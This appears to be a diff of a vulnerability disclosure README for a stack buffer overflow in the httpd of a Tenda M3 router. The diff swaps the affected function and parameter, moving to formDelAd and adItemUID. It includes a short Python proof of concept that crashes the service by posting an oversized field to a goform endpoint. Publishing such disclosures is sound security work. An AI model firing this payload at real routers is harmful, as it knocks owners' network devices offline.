@@ -1,8 +1,8 @@
-# Tenda M3 contains Stack Overflow Vulnerability
+# Tenda M3 contains Stack Buffer Overflow Vulnerability
 
 ## overview
 
-- type: stack overflow vulnerability
+- type: stack buffer overflow vulnerability
 
 - supplier: Tenda https://www.tenda.com 
 
@@ -16,11 +16,13 @@
 
 ### 1. Vulnerability Details
 
-the `httpd` in directory `/bin` has a stack overflow. The vunlerability is in fucntion `formexeCommand` 
+the `httpd` in directory `/bin` has a buffer overflow. The vunlerability is in fucntion `formDelAd` 
 
-![image-20220818231337695](readme.assets/image-20220818231337695.png)
+![image-20220819153517143](readme.assets/image-20220819153517143.png)
 
-In this function, is copies POST parameter `cmdinput` to stack buffer without checking its length, causing a stack overflow vulnerability. 
+In this function, it copies POST parameter `adItemUID` to stack buffer `v6`
+
+If `s` is too long, it will causes dos(deny of service)
 
 ### 2. Recurring loopholes and POC
 
@@ -35,14 +37,15 @@ poc of DOS(deny of service)
 import requests
 
 data = {
-    "cmdinput": "a"*0x400
+    "adItemUID": "a"*0x2000
 }
 cookies = {
     "user": "admin"
 }
-res = requests.post("http://127.0.0.1/goform/exeCommand", data=data, cookies=cookies)
+res = requests.post("http://127.0.0.1/goform/delAd", data=data, cookies=cookies)
 print(res.content)
 ```
 
-![image-20220818232005637](readme.assets/image-20220818232005637.png)
+![image-20220819153543318](readme.assets/image-20220819153543318.png)
 
+![image-20220819153625861](readme.assets/image-20220819153625861.png)
